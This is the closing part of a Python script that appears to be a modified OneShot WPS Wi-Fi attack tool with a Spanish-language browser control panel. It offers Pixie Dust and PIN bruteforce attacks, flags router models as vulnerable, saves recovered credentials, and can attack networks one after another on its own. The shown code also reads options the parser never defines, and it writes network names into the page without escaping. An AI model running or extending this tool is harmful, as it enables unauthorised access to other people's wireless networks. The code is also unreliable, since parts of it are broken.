                        const isAtBottom = div.scrollHeight - div.clientHeight <= div.scrollTop + 1;
                        div.innerHTML = logs.map(l => {
                            const time = l.match(/\[(.*?)\]/)?.[1] || '--:--:--';
                            const msg = l.replace(/\[.*?\] /, '');
                            return `<div class="log-line"><span class="log-time">${time}</span>${msg}</div>`;
                        }).join('');
                        if (isAtBottom) div.scrollTop = div.scrollHeight;
                    });
                }

                function updateNetworks() {
                    fetch('/api/networks').then(r => r.json()).then(nets => {
                        if(!nets || Object.keys(nets).length === 0) return;
                        const container = document.getElementById('networksList');
                        let html = '';
                        
                        const netArray = Array.isArray(nets) ? nets : Object.values(nets);
                        
                        netArray.forEach(n => {
                            const isVuln = n.Model && (n.Model.includes('Archer') || n.Model.includes('TD-W'));
                            const wpsLocked = n['WPS locked'];
                            const signal = Math.min(Math.max(2 * (n.Level + 100), 0), 100);
                            
                            html += `
                            <div class="net-item">
                                <div class="net-main">
                                    <div class="net-info">
                                        <div class="net-essid ${isVuln ? 'vuln' : ''}">${n.ESSID || '<Oculto>'}</div>
                                        <div class="net-bssid">${n.BSSID}</div>
                                    </div>
                                    <div class="pwr-bar">
                                        <div class="pwr-val" style="width: ${signal}%"></div>
                                    </div>
                                </div>
                                <div class="net-stats">
                                    <span class="badge">${n['Security type']}</span>
                                    <span class="badge ${wpsLocked ? 'locked' : 'vuln'}">WPS: ${wpsLocked ? 'LOCKED' : 'OPEN'}</span>
                                    ${isVuln ? '<span class="badge vuln">VULNERABLE</span>' : ''}
                                </div>
                                <button class="btn-attack" onclick="attack('${n.BSSID}')" ${wpsLocked ? 'disabled style="opacity:0.5"' : ''}>
                                    ${wpsLocked ? 'BLOQUEADO' : 'INICIAR ATAQUE'}
                                </button>
                            </div>`;
                        });
                        container.innerHTML = html || 'No se encontraron redes WPS.';
                    });
                }

                function updateStatus() {
                    fetch('/api/status').then(r => r.json()).then(status => {
                        const btn = document.getElementById('scanBtn');
                        if(status.is_scanning) {
                            btn.disabled = true;
                            btn.innerText = 'ESCANEANDO...';
                        } else {
                            btn.disabled = false;
                            btn.innerText = 'ESCANEAR';
                        }
                    });
                }

                setInterval(updateLogs, 1500);
                setInterval(updateNetworks, 4000);
                setInterval(updateStatus, 2000);
                updateLogs();
            </script>
        </body>
        </html>
        """



def open_browser(port):
    try:
        # Intentar abrir con termux-open-url (Android/Termux) o xdg-open (Linux)
        for cmd in [f"termux-open-url http://localhost:{port}", f"xdg-open http://localhost:{port}"]:
            if subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0:
                break
    except:
        pass

def start_web_server(scanner, args, port=8080):
    GLOBAL_STATE['scanner'] = scanner
    GLOBAL_STATE['args'] = args
    
    # Permitir reutilizar el puerto si el script se reinicia rápido
    class ReusableHTTPServer(HTTPServer):
        allow_reuse_address = True

    def run():
        try:
            server = ReusableHTTPServer(('0.0.0.0', port), WebHandler)
            server.serve_forever()
        except Exception as e:
            error(f"Error en servidor web: {e}")

    thread = threading.Thread(target=run, daemon=True)
    thread.start()

    print(f"\n{Colors.GREEN}[*]{Colors.WHITE} App Web iniciada en {Colors.CYAN}http://localhost:{port}{Colors.RESET}")
    print(f"{Colors.DIM}• Controla el escaneo y los ataques desde tu navegador.{Colors.RESET}\n")

    # Abrir navegador automáticamente
    open_browser(port)

    return thread


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(
        description='OneShotPin 0.0.2 (c) 2017 rofl0r (modified).',
        epilog='Example: %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K'
        )

    parser.add_argument(
        '-i', '--interface',
        type=str,
        required=True,
        help='Name of the interface to use'
        )
    parser.add_argument(
        '-b', '--bssid',
        type=str,
        help='BSSID of the target AP'
        )
    parser.add_argument(
        '-p', '--pin',
        type=str,
        help='Use the specified pin (arbitrary string or 4/8 digit pin)'
        )
    parser.add_argument(
        '-K', '--pixie-dust',
        action='store_true',
        help='Run Pixie Dust attack'
        )
    parser.add_argument(
        '-F', '--pixie-force',
        action='store_true',
        help='Run Pixiewps with --force option (bruteforce full range)'
        )
    parser.add_argument(
        '-X', '--show-pixie-cmd',
        action='store_true',
        help='Always print Pixiewps command'
        )
    parser.add_argument(
        '-B', '--bruteforce',
        action='store_true',
        help='Run online bruteforce attack'
        )
    parser.add_argument(
        '-d', '--delay',
        type=float,
        help='Set the delay between pin attempts'
        )
    parser.add_argument(
        '-w', '--write',
        action='store_true',
        help='Write credentials to the file on success'
        )
    parser.add_argument(
        '--iface-down',
        action='store_true',
        help='Down network interface when the work is finished'
        )
    parser.add_argument(
        '--vuln-list',
        type=str,
        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt',
        help='Use custom file with vulnerable devices list'
    )
    parser.add_argument(
        '-l', '--loop',
        action='store_true',
        help='Run in a loop'
    )
    parser.add_argument(
        '-r', '--reverse-scan',
        action='store_true',
        help='Reverse order of networks in the list of networks. Useful on small displays'
    )
    parser.add_argument(
        '-W', '--web',
        action='store_true',
        help='Iniciar la App Web en localhost para controlar todo desde el navegador'
    )
    parser.add_argument(
        '--web-port',
        type=int,
        default=8080,
        help='Puerto para el servidor web (por defecto: 8080)'
    )

    args = parser.parse_args()

    if sys.hexversion < 0x03060F0:
        die("The program requires Python 3.6 and above")
    
    if os.getuid() != 0:
        error("Error: No tienes privilegios de root.")
        if os.path.exists('/data/data/com.termux/files/usr/bin/tsu'):
            info("En Termux, usa: tsu -c 'python wps.py ...'")
        else:
            info("Usa 'sudo' para ejecutar este script.")
        sys.exit(1)

    if not ifaceUp(args.interface):
        die(f'Unable to up interface "{args.interface}"')

    check_and_disconnect(args.interface)

    # Cargar lista vulnerable una vez
    try:
        with open(args.vuln_list, 'r', encoding='utf-8') as file:
            vuln_list = file.read().splitlines()
    except FileNotFoundError:
        vuln_list = []
    
    scanner = WiFiScanner(args.interface, vuln_list)

    if args.web:
        start_web_server(scanner, args, args.web_port)
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            ani(f"\n{Colors.RED}[!] Goodbye!{Colors.RESET}")
            sys.exit(0)

    failed_bssids = set()
    companion = None
    while True:
        try:
            if args.auto:
                if not companion:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                res = companion.auto_connection(scanner, args.pixie_dust, args.show_pixie_cmd, args.pixie_force, failed_bssids)
                if res:
                    # Si se intentó una red, continuamos para re-escanear y buscar la siguiente
                    if args.loop or args.auto:
                        info("Esperando 5 segundos para el próximo escaneo...")
                        time.sleep(5)
                    continue
                else:
                    # No hay más redes para intentar en este escaneo
                    if args.loop or args.auto:
                        info("No hay nuevas redes para atacar. Esperando 5 segundos...")
                        time.sleep(5)
                        continue
                    else:
                        break

            if not args.bssid:
                if not args.loop:
                    info('BSSID not specified (--bssid) — scanning for available networks')
                args.bssid = scanner.prompt_network()

            if args.bssid:
                if not companion:
                    companion = Companion(args.interface, args.write, print_debug=args.verbose)
                if args.bruteforce:
                    companion.smart_bruteforce(args.bssid, args.pin, args.delay)
                else:
                    companion.single_connection(args.bssid, args.pin, args.pixie_dust,
                                                args.show_pixie_cmd, args.pixie_force)
            if not args.loop:
                break
            else:
                args.bssid = None
        except KeyboardInterrupt:
            if args.loop:
                if input(f"\n{Colors.YELLOW}[?]{Colors.WHITE} Exit the script (otherwise continue to AP scan)? [N/y] ").lower() == 'y':
                    ani(f"\n{Colors.RED}[!] Goodbye!{Colors.RESET}")
                    break
                else:
                    args.bssid = None
            else:
                ani(f"\n{Colors.RED}[!] Goodbye!{Colors.RESET}")
                break

    if args.iface_down:
        ifaceUp(args.interface, down=True)

